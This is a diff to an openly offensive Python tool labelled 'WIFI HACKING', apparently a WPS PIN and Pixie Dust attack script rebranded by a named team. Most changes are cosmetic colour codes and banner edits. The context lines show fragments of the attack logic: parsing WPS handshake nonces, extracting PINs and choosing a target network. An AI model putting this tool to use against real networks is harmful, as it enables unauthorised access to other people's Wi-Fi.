@@ -5,7 +5,7 @@ import sys, subprocess, os, tempfile, shutil, re, codecs, socket, pathlib, time,
 from datetime import datetime
 from typing import Dict
 os.system('clear')
-print('[\033[1;33m*\033[1;37m] WIFI HACKING\n[\033[1;33m*\033[1;37m] MODIFIED BY @MOHAMMAD ALAMIN\n[\033[1;33m*\033[1;37m] TEAM TOXINUM\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+print('[\033[1;33m*\033[1;37m] WIFI HACKING (1.0.0)\n[\033[1;33m*\033[1;37m] MODIFIED BY @MOHAMMAD ALAMIN\n[\033[1;33m*\033[1;37m] TEAM TOXINUM\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 class NetworkAddress:
     def __init__(self, mac):
         if isinstance(mac, int):
@@ -15,7 +15,7 @@ class NetworkAddress:
             self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
             self._int_repr = self._mac2int(mac)
         else:
-            raise ValueError('MAC address must be string or integer')
+            raise ValueError('MAC ADDRESS MUST BE STRING OR INTEGER')
 
     @property
     def string(self):
@@ -463,11 +463,11 @@ class Companion:
                 self.connection_status.last_m_message = n
                 print('[\033[1;33m*\033[1;37m] Received WPS Message M{}'.format(n))
                 if n == 5:
-                    print('[+] The first half of the PIN is valid')
+                    print('[\033[1;32m+\033[1;37m] The first half of the PIN is valid')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
                 print('[\033[1;33m*\033[1;37m] Received WSC NACK')
-                print('[-] Error: wrong PIN code')
+                print('[\033[1;31m-\033[1;37m] Error: wrong PIN code')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 assert(len(self.pixie_creds.e_nonce) == 16*2)
@@ -509,14 +509,14 @@ class Companion:
             self.connection_status.status = 'WPS_FAIL'
             print('[\033[1;31m-\033[1;37m]  wpa_supplicant returned WPS-FAIL')
 #        elif 'NL80211_CMD_DEL_STATION' in line:
-#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+#            print("[\033[1;31m!\033[1;37m] Unexpected interference — kill NetworkManager/wpa_supplicant!")
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
             print('[\033[1;33m*\033[1;37m] Authenticating…')
         elif 'Authentication response' in line:
-            print('[+] Authenticated')
+            print('[\033[1;32m+\033[1;37m] Authenticated')
         elif 'Trying to associate with' in line:
             self.connection_status.status = 'associating'
             if 'SSID' in line:
@@ -549,7 +549,7 @@ class Companion:
         if r.returncode == 0:
             lines = r.stdout.splitlines()
             for line in lines:
-                if ('[+]' in line) and ('WPS pin' in line):
+                if ('[\033[1;32m+\033[1;37m]' in line) and ('WPS pin' in line):
                     pin = line.split(':')[-1].strip()
                     if pin == '<empty>':
                         pin = "''"
@@ -625,7 +625,7 @@ class Companion:
         if 'OK' not in r:
             self.connection_status.status = 'WPS_FAIL'
             if r == 'UNKNOWN COMMAND':
-                print('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
+                print('[\033[1;31m!\033[1;37m] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                       'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
             else:
                 print('[\033[1;31m!\033[1;37m] Something went wrong — check out debug log')
@@ -896,7 +896,7 @@ class WiFiScanner:
 
         for line in lines:
             if line.startswith('command failed:'):
-                print('[!] Error:', line)
+                print('[\033[1;31m!\033[1;37m] Error:', line)
                 return False
             line = line.strip('\t')
             for regexp, handler in matchers.items():
@@ -980,14 +980,14 @@ class WiFiScanner:
     def prompt_network(self) -> str:
         networks = self.iw_scanner()
         if not networks:
-            print('[-] No WPS networks found.')
+            print('[\033[1;31m-\033[1;37m] No WPS networks found.')
             return
         while 1:
             try:
                 networkNo = input('[\033[1;33m*\033[1;37m] SELECT TARGET (PRESS ENTER TO REFRESH): ')
                 if networkNo.lower() in ('r', '0', ''):
                     os.system('clear')
-                    print('[\033[1;33m*\033[1;37m] WIFI HACKING\n[\033[1;33m*\033[1;37m] MODIFIED BY @MOHAMMAD ALAMIN\n[\033[1;33m*\033[1;37m] TEAM TOXINUM\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+                    print('[\033[1;33m*\033[1;37m] WIFI HACKING (1.0.0)\n[\033[1;33m*\033[1;37m] MODIFIED BY @MOHAMMAD ALAMIN\n[\033[1;33m*\033[1;37m] TEAM TOXINUM\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
                     return networks[int(networkNo)]['BSSID']
